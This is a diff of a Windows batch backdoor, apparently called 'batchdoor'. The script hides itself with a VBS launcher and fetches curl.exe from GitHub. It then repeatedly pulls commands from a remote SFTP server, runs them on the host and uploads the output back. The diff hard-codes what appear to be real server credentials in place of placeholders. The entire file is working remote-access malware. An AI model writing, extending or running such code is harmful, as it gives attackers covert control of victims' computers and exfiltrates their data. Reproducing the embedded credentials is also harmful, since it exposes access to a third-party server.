@@ -1,10 +1,10 @@
 @echo off
-title cathack v1.0 :)
+title batchdoor v1.2 :)
 if exist h.vbs (
 goto s
 ) else (
 echo Set WshShell = CreateObject^("WScript.Shell"^) > h.vbs
-          echo WshShell.Run chr(34^) ^& "batchbackdoor.bat" ^& Chr(34^), 0 >> h.vbs
+          echo WshShell.Run chr(34^) ^& "batchdoor.bat" ^& Chr(34^), 0 >> h.vbs
              echo Set WshShell = Nothing >> h.vbs
     cscript //B h.vbs
     goto eof
@@ -12,20 +12,22 @@ echo Set WshShell = CreateObject^("WScript.Shell"^) > h.vbs
 :s
 del h.vbs
 rem msg * You have been hacked :)
+echo if.
 if not exist curl.exe (
-wget https://github.com/gato001k1/project-batch-message-app/raw/main/curl.exe
-set "curlpath=%~dp0curl.exe"
+    rem if you want to use sftp leave this :)
+curl -LJO https://github.com/gato001k1/project-batch-message-app/raw/main/curl.exe
+set "curlpath2=%~dp0curl.exe"
 goto c
 ) else (
-    set "curlpath=%~dp0curl.exe"
+    set "curlpath2=%~dp0curl.exe"
 goto c
 )
 :c
-rem set up the ip addresses manually
-set "server=1"
-set "username=1"
-set "password=1"
-set "sftpmode=sftp"
+rem set up the ip addresses manually can be sftp or ftp dont enter the sftp://
+set "server2=rubin-free.falixserver.net:393"
+set "username2=vgsltqzafc.2969eda3"
+set "password2=nBCvvF56X"
+set "sftpmode2=sftp"
 :loop2
 if NOT EXIST sftpchecker (
     mkdir sftpchecker
@@ -40,30 +42,31 @@ if exist com (
     set local_file_size=0
 )
 cd sftpchecker
- "%curlpath%" --user %username%:%password% -o com %sftpmode%://%server%/com -k
+"%curlpath2%" --user %username2%:%password2% -o com %sftpmode2%://%server2%/com -k
 if exist com (
-    for %%A in (com) do set server_file_size=%%~zA
+    for %%A in (com) do set server2_file_size=%%~zA
     cd ..
 ) else (
-    set server_file_size=0
+    set server2_file_size=0
+    cd ..
 )
 rem bug
 goto f
 :f
-if %local_file_size% equ %server_file_size% (
+if %local_file_size% equ %server2_file_size% (
     goto sftpchecked
 ) else (
    goto bug
 )
 :bug
-    "%curlpath%" --user %username%:%password% -o com %sftpmode%://%server%/com -k
+    "%curlpath2%" --user %username2%:%password2% -o com %sftpmode2%://%server2%/com -k
     set /p comman=<com
     if "%comman%"=="exitser" (
         goto eof
     ) else (
+        %cd% ~ >> hak
     %comman% >> hak
-    timeout /T 1
-"%curlpath%" -u %username%:%password% -T "hak" %sftpmode%://%server% -k
+"%curlpath2%" -u %username2%:%password2% -T "hak" %sftpmode2%://%server2% -k
     goto sftpchecked
     )
 :eof
